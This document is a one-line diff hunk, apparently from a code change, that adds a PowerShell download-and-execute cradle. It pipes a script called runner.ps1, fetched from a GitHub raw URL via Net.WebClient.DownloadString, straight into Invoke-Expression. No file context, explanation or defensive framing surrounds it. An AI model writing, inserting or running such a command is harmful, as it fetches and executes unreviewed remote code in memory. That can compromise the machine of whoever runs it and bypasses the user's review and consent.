@@ -1,0 +1,1 @@
+iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dievus/PowerShellRunner/main/runner.ps1')
